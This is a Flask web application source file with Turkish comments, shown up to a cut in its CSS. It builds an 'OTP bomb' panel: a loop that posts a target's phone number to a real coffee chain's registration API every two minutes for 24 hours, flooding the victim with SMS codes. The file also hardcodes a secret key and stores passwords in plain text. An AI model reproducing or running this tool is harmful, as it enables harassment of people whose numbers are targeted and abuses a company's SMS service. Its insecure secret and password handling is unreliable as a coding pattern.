from flask import Flask, render_template_string, request, jsonify, redirect, url_for
from flask_sqlalchemy import SQLAlchemy
from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user
import threading
import time
import requests
import random
import os
import datetime

app = Flask(__name__)
app.config['SECRET_KEY'] = 'dis5-private-key-99'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'
db = SQLAlchemy(app)
login_manager = LoginManager(app)
login_manager.login_view = 'login'

# --- VERİTABANI MODELLERİ ---
class User(UserMixin, db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(50), unique=True, nullable=False)
    password = db.Column(db.String(50), nullable=False)

# Koruma Altındaki Numaralar (Anti-Bomb)
protected_numbers = set()

# --- MOTOR SİSTEMİ ---
def send_otp_bomb(full_phone):
    if full_phone in protected_numbers:
        print(f"[SHIELD] {full_phone} KORUMA ALTINDA! ISLEM IPTAL.")
        return

    end_time = datetime.datetime.now() + datetime.timedelta(hours=24)
    print(f"[DIS5-EUROPE] Operasyon Baslatildi: {full_phone}")

    while datetime.datetime.now() < end_time:
        if full_phone in protected_numbers: break
        try:
            # Kahve Dunyasi API
            requests.post("https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number", 
                json={"phoneNumber": full_phone, "otp": str(random.randint(100000, 999999))},
                headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"},
                timeout=10)
            print(f"[DIS5-EUROPE] Paket Gonderildi: {full_phone}")
        except:
            pass
        time.sleep(120 + random.uniform(0.1, 5.0))

# --- TASARIM VE TEMA (ORIGINAL DIS5) ---
CSS = """
<style>
    body { background: #000; color: #fff; font-family: 'Arial', sans-serif; margin: 0; height: 100vh; display: flex; justify-content: center; align-items: center; flex-direction: column; }
    .panel { background: #0a0a0a; border: 1px solid #1a1a1a; padding: 40px; border-radius: 5px; width: 360px; text-align: center; }
    .header h1 { font-size: 0.9em; letter-spacing: 5px; text-transform: uppercase; margin-bottom: 5px; }
    .header p { font-size: 0.6em; color: #444; letter-spacing: 2px; margin-bottom: 30px; }
    .input-group { background: #111; border: 1px solid #222; display: flex; align-items: center; margin-bottom: 20px; }
    .prefix { color: #555; padding: 0 15px; font-weight: bold; border-right: 1px solid #222; }
    input, select { background: transparent; border: none; color: #fff; padding: 15px; outline: none; width: 100%; letter-spacing: 2px; }
    .btn { width: 100%; background: #fff; color: #000; border: none; padding: 18px; font-weight: 900; cursor: pointer; letter-spacing: 1px; text-transform: uppercase; transition: 0.3s; margin-top: 10px; }
    .btn:hover { background: #ccc; }
    .btn-anti { background: #ff0000; color: #fff; font-size: 0.7em; }
    .links { margin-top: 20px; font-size: 0.6em; }
    .links a { color:
